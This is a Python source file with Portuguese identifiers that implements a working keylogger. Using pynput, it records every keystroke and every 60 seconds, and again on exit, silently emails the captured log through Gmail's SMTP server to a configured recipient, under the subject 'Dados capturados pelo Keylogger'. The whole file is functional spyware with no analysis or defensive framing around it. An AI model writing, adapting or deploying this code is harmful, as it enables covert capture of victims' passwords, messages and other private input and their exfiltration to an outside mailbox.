from  pynput import keyboard
import smtplib
import atexit
from email.mime.text import MIMEText
from threading import Timer

log = ""

EMAIL_ORIGEM = "EMAIL_ORIGEM"
EMAIL_DESTINO = "EMAIL_DESTINO"
SENHA_EMAIL = "SENHA_EMAIL"

IGNORAR = {keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l,
           keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.ctrl,
           keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.alt,
           keyboard.Key.caps_lock, keyboard.Key.cmd}

INTERVALO_ENVIO = 60

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'Dados capturados pelo Keylogger'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            pass
        finally:
            log = ""

    Timer(INTERVALO_ENVIO, enviar_email).start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += " [BKS] "
        elif key not in IGNORAR:
            log += f" [{key.name}] "

atexit.register(enviar_email)

enviar_email()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
